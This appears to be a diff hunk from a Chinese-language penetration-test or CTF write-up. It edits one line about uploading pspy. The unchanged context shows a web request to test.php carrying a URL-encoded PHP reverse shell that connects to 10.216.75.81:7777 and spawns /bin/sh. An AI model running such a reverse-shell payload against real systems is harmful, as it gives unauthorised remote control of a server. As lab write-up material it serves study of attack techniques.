@@ -262,4 +262,5 @@ page的内容随便写什么，只要里面用了`[[shell]]`(这里shell是因�
 http://baker.dsz/pages/test.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.216.75.81%22%2C7777)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
 ```
 
-传pspy看一下
+传pspy看一下：
+
